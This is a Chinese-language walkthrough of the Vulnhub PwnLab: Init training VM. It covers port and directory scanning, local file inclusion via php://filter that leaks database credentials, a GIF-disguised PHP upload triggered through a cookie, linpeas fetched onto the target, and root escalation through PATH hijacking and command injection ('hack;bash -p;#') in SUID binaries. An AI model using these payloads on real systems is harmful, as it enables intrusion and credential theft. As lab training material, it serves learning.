---
title: Vulnhub-PWNLAB:INIT
date: 2024-02-23  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,pwn]  
permalink: "/Vulnhub/Pwnlab-init.html"
---

# PWNLAB: INIT

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423725.png" alt="image-20240223101356389" style="zoom:50%;" />

看上去似乎很友善，打开看一下，和以前一样，采用NAT模式使用：

![image-20240223102650132](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423727.png)

扫一下：

![image-20240223103001041](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423728.png)

又是风平浪静的一天，真好。。。

开始公鸡！！！

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.244.134 -- -A -sV -sT
```

```text
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.244.134:80
Open 192.168.244.134:111
Open 192.168.244.134:3306
Open 192.168.244.134:44194
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 21:34 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
Initiating Ping Scan at 21:34
Scanning 192.168.244.134 [2 ports]
Completed Ping Scan at 21:34, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:34
Completed Parallel DNS resolution of 1 host. at 21:34, 4.24s elapsed
DNS resolution of 1 IPs took 4.24s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating Connect Scan at 21:34
Scanning 192.168.244.134 [4 ports]
Discovered open port 80/tcp on 192.168.244.134
Discovered open port 111/tcp on 192.168.244.134
Discovered open port 3306/tcp on 192.168.244.134
Discovered open port 44194/tcp on 192.168.244.134
Completed Connect Scan at 21:34, 0.00s elapsed (4 total ports)
Initiating Service scan at 21:34
Scanning 4 services on 192.168.244.134
Completed Service scan at 21:34, 11.05s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.244.134.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.16s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
Nmap scan report for 192.168.244.134
Host is up, received syn-ack (0.00058s latency).
Scanned at 2024-02-22 21:34:13 EST for 11s

PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40471/udp6  status
|   100024  1          44194/tcp   status
|   100024  1          48585/udp   status
|_  100024  1          57355/tcp6  status
3306/tcp  open  mysql   syn-ack MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 40
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongPassword, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsCompression, InteractiveClient, ODBCClient, LongColumnFlag, FoundRows, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: `MA<J=3&cDfW_Wvl<'L*
|_  Auth Plugin Name: mysql_native_password
44194/tcp open  status  syn-ack 1 (RPC #100024)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds
```

### 访问一下

![image-20240223103817519](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423729.png)

![image-20240223103935358](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423730.png)

尝试万能密码，但是登录失败了！

![image-20240223103951531](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423731.png)

### 	Wappalyzer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423732.png" alt="image-20240223103849795" style="zoom:50%;" />

阅读一下源码，看看有没有收获，但是没发现啥有用的东西！

### 目录扫描

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.244.134 -f -t 200
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.244.134
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload/              (Status: 200) [Size: 744]
/images/              (Status: 200) [Size: 944]
/icons/               (Status: 403) [Size: 296]
/server-status/       (Status: 403) [Size: 304]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

我们再看一下有啥信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423733.png" alt="image-20240223113110678" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423734.png" alt="image-20240223113137440" style="zoom: 33%;" />

### Nikto

```bash
nikto -h http://192.168.244.134
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.244.134
+ Target Hostname:    192.168.244.134
+ Target Port:        80
+ Start Time:         2024-02-22 22:24:38 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2024-02-22 22:24:55 (GMT-5) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞利用

### LFI

扫出来的东西感觉比较少，但是也还有用，再看看有啥利用的地方：

![image-20240223114239076](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423735.png)

图片也没有隐写。

再次查找，看到几个网址好像可以尝试进行利用：

```bash
http://192.168.244.134/?page=login
http://192.168.244.134/?page=upload
```

可以尝试`LFI`利用：

```text
http://192.168.244.134/?page=php://filter/read=convert.base64-encode/resource=login
```

![image-20240223114942953](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423736.png)

看来就可以使用了，解码一下：

```text
PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==
```

```text
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);

	$stmt->execute();
	$stmt->store_Result();

	if ($stmt->num_rows == 1)
	{
		$_SESSION['user'] = $luser;
		header('Location: ?page=upload');
	}
	else
	{
		echo "Login failed.";
	}
}
else
{
	?>
	<form action="" method="POST">
	<label>Username: </label><input id="user" type="test" name="user"><br />
	<label>Password: </label><input id="pass" type="password" name="pass"><br />
	<input type="submit" name="submit" value="Login">
	</form>
	<?php
}
```

发现包含了一个`cookie=lang`：

![image-20240223122459143](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423737.png)

```url
http://192.168.244.134/?page=php://filter/read=convert.base64-encode/resource=config
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423738.png" alt="image-20240223115926106" style="zoom:50%;" />

```text
PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+
```

```text
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

找到了账号密码！！

```text
http://192.168.244.134/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
# 无回显
```

尝试登录数据库：

```sql
mysql -uroot -pH4u%QJ_H99 -h 192.168.244.134
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 73
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.001 sec)

MySQL [(none)]> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.001 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.002 sec)
```

解码结果：

```sql
+------+------------------------------+
| user |             pass             |
+------+------------------------------+
| kent | Sld6WHVCSkpOeQ==(JWzXuBJJNy) |
| mike | U0lmZHNURW42SQ==(SIfdsTEn6I) |
| kane | aVN2NVltMkdSbw==(iSv5Ym2GRo) |
+------+------------------------------+
```

尝试进行登录，成功进入：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423739.png" alt="image-20240223121348651" style="zoom:33%;" />

​	查看一下上传的代码：

```text
http://192.168.244.134/?page=php://filter/read=convert.base64-encode/resource=upload
```

```text
PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGluLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICcuJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZyIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgNCcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg==
```

```text
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

发现文件限制传`.jpg,.jpeg,.gif,.png`几种文件，修改一下尝试上传：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423740.png" alt="image-20240223123800821" style="zoom:50%;" />

在文件头加上`GIFa89`：

![image-20240223123846803](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423741.png)

![image-20240223123858299](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423742.png)

```shell
curl 192.168.244.134 -H "cookie:lang=../upload/e4919f92b26f69d7e89d2ef400c78a97.gif"

nc -lvp 1234
```

## 提权

```bash
whoami
id
python -c 'import pty; pty.spawn("/bin/sh")'
```

查看一些有无`root`权限用户：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423743.png" alt="image-20240223124904868" style="zoom:50%;" />

```bash
# kali
python3 -m http.server 8888
# kane
cd /tmp
wget http://192.168.244.128:8888/linpeas.sh
chmod +x linpeas.sh
```

进行信息搜集，看到了一个有趣的`SUID`：

![image-20240223130650985](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423744.png)

![image-20240223130704174](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423745.png)

查看一下：

```bash
cd /home/kane
ls -la
# total 32
# drwxr-x--- 3 kane kane 4096 Feb 22 23:56 .
# drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
# -rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
# -rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
# drwx------ 2 kane kane 4096 Feb 22 23:56 .gnupg
# -rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
# -rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
./msgmike
# cat: /home/mike/msg.txt: No such file or directory
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

```bash
find / -perm -u=s -type f 2>/dev/null
# /bin/mount
# /bin/su
# /bin/umount
# /sbin/mount.nfs
# /home/kane/msgmike
# /usr/bin/newgrp
# /usr/bin/chfn
# /usr/bin/at
# /usr/bin/passwd
# /usr/bin/procmail
# /usr/bin/chsh
# /usr/bin/gpasswd
# /usr/lib/eject/dmcrypt-get-device
# /usr/lib/pt_chown
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /usr/lib/openssh/ssh-keysign
# /usr/sbin/exim4
```

看来得获得一个`mike`用户的shell：

```bash
echo bash -p > cat
chmod 777 cat
PATH=.:$PATH ./msgmike
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423746.png" alt="image-20240223134350525" style="zoom:50%;" />

我们尝试传到本地进行分析一下：

```shell
# mike
python -m SimpleHTTPServer 8877

# kali
wget http://192.168.244.134:8877/msg2root
```

使用相关工具简单分析一下这个文件，或者使用`IDA`进行分析：

```
objdump -D -M intel msg2root | less
```

分析一下主函数：

```assembly
080484ab <main>:
 80484ab:       8d 4c 24 04             lea    ecx,[esp+0x4]
 80484af:       83 e4 f0                and    esp,0xfffffff0
 80484b2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
 80484b5:       55                      push   ebp
 80484b6:       89 e5                   mov    ebp,esp
 80484b8:       51                      push   ecx
 80484b9:       83 ec 74                sub    esp,0x74
 80484bc:       83 ec 0c                sub    esp,0xc
 80484bf:       68 b0 85 04 08          push   0x80485b0
 80484c4:       e8 87 fe ff ff          call   8048350 <printf@plt>
 80484c9:       83 c4 10                add    esp,0x10
 80484cc:       a1 f4 97 04 08          mov    eax,ds:0x80497f4
 80484d1:       83 ec 04                sub    esp,0x4
 80484d4:       50                      push   eax
 80484c9:       83 c4 10                add    esp,0x10
 80484cc:       a1 f4 97 04 08          mov    eax,ds:0x80497f4
 80484d1:       83 ec 04                sub    esp,0x4
 80484d4:       50                      push   eax
 80484d5:       6a 64                   push   0x64
 80484d7:       8d 45 90                lea    eax,[ebp-0x70]
 80484da:       50                      push   eax
 80484db:       e8 80 fe ff ff          call   8048360 <fgets@plt>
 80484e0:       83 c4 10                add    esp,0x10
 80484e3:       83 ec 04                sub    esp,0x4
 80484e6:       8d 45 90                lea    eax,[ebp-0x70]
 80484e9:       50                      push   eax
 80484ea:       68 c4 85 04 08          push   0x80485c4
 80484ef:       8d 45 f4                lea    eax,[ebp-0xc]
 80484f2:       50                      push   eax
 80484f3:       e8 a8 fe ff ff          call   80483a0 <asprintf@plt>
 80484f8:       83 c4 10                add    esp,0x10
 80484fb:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80484fe:       83 ec 0c                sub    esp,0xc
 8048501:       50                      push   eax
 8048502:       e8 69 fe ff ff          call   8048370 <system@plt>
 8048507:       83 c4 10                add    esp,0x10
 804850a:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
 804850d:       c9                      leave
 804850e:       8d 61 fc                lea    esp,[ecx-0x4]
 8048511:       c3                      ret
 8048512:       66 90                   xchg   ax,ax
 8048514:       66 90                   xchg   ax,ax
 8048516:       66 90                   xchg   ax,ax
 8048518:       66 90                   xchg   ax,ax
 804851a:       66 90                   xchg   ax,ax
 804851c:       66 90                   xchg   ax,ax
 804851e:       66 90                   xchg   ax,ax
```

```shell
objdump -s -j .rodata msg2root
```

```assembly
msg2root:     file format elf32-i386
Contents of section .rodata:
 80485a8 03000000 01000200 4d657373 61676520  ........Message 
 80485b8 666f7220 726f6f74 3a200000 2f62696e  for root: ../bin
 80485c8 2f656368 6f202573 203e3e20 2f726f6f  /echo %s >> /roo
 80485d8 742f6d65 73736167 65732e74 787400    t/messages.txt. 
```

`IDA`反汇编结果为：

```c
# main 函数
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+8h] [ebp-70h]
  char *command; // [esp+6Ch] [ebp-Ch]

  printf("Message for root: ");
  fgets(&s, 100, _bss_start);
  asprintf(&command, "/bin/echo %s >> /root/messages.txt", &s);
  return system(command);
}
```

- 打印字符串 ( `printf`)
- 从用户处获取一个字符串并将其存储在堆栈中的`[ebp-0x70]`( `fgets`)
- 将输入字符串插入到格式字符串中`0x80485c4`并将结果字符串存储在`[ebp-0xc]`( `asprintf`)
- `0x80485c4`：`/bin/echo %s >> /root/messages.txt`
- `asprintf`调用调用 `system`产生的字符串

尝试进行利用：

```
./msg2root
hack;bash -p;#
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402231423747.png" alt="image-20240223142202147" style="zoom:33%;" />

获得到了flag！！！！